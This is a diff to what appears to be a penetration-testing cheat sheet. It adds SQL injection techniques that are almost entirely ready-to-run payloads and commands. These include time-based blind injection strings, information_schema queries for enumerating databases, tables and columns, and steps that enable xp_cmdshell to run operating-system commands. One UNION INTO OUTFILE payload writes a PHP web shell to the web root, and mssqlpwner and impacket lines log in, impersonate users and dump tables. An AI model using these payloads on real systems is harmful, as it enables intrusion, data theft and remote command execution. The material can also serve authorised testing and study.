@@ -121,17 +121,54 @@ Set inputs to 0
 	...; id #
 Include # to comment out code behind  
 
-## MSSQL
+### MySQL Blind
+	INJECTION and if (1=1,sleep(3),'false')
+
+### MSSQL Blind
+	INJECTION;waitfor delay '0:0:3';
+
+## SQL info extraction
+### list db
+	select schema_name from information_schema.schemata
+if dbo is listed, server is MSSQL. use `select name from sys.databases` instead  
+
+### list tables mysql
+	select table_name from information_schema.tables where table_schema='db'
+
+### list tables mssql
+	select table_name from db.information_schema.tables
+
+### list columns mysql
+	select column_name, data_type from information_schema.columns where table_schema='db' and table_name='table'
+to reference a table, use `db.table`  
+
+### list tables mssql
+	select column_name, data_type from db.information_schema.columns where table_name='table'
+to reference a table, use `db.dbo.table`  
+
+## SQL to shell
+### mssql
+	EXECUTE sp_configure 'show advanced options', 1;
+	RECONFIGURE;
+	EXECUTE sp_configure 'xp_cmdshell', 1;
+	RECONFIGURE;
+	EXECUTE xp_cmdshell 'whoami';
+
+### mysql
+	INJECTION' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/webshell.php"; -- - 
+Disk location must be writable. Find a way to execute the php file
+
+## SQL Misc
 ### mssqlpwner
 	mssqlpwner domain/user:password@123.123.123.123 interactive
 Flags: Connect to SQL server in interactive shell  
 
 	mssqlpwner domain/user:password@123.123.123.123 direct-query "execute as login = appdev;use databasename;select * from users"
 Flags: Execute direct query, impersonate as appdev, dump users table  
+
 ### nxc
 	nxc mssql 123.123.123.123 -u user -p password --rid-brute > rid-output.txt
 Flags: Domain username RID bruteforce, save results  
-
 
 ## Password Cracking
 ### MD5 Rainbow Table
@@ -164,6 +201,13 @@ List shares
 
 	impacket-psexec username:password@123.123.123.123
 Use `\` to escape special characters in password. Requires admin  
+
+### MSSQL login
+	impacket-mssqlclient user:password@123.123.123.123 -windows-auth
+windows-auth uses NTLM  
+
+### MySQL login
+	mysql -u user -p'pass' -h 123.123.123.123 -P 3306 --skip-ssl-verify-server-cert
 
 # STAGE 3 - PRIVILEGE ESCALATION
 ## Weakness Enumeration (Linpeas/Winpeas)
